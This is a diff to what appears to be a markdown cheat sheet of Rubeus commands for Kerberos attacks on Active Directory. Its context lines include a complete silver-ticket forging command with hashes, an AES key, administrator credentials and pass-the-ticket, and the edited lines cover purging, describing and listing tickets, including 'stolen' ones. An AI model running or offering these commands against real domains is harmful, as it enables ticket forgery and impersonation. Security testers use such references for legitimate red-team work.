@@ -488,11 +488,11 @@ Silver:
 ```rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01 /user:whoever /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ecorp.lab /ptt```
 
 #### Maintenance
-Purge all kerberos tickets similar to Mimikatz ```kerberos::purge```:
-```rubeus.exe purge```
+Purge all kerberos tickets: ```rubeus.exe purge```
 
 View ticket: 
-```rubeus.exe describe``` ```/ticket:doIFNDCCBTCg...bA==``` OR ```/ticket:stolen_users_club.kirbi```
+
+```rubeus.exe describe``` AND ```/ticket:doIFNDCCBTCg...bA==``` OR ```/ticket:stolen_users_club.kirbi```
 
 View active tickets by LUID: 
 ```rubeus.exe triage```
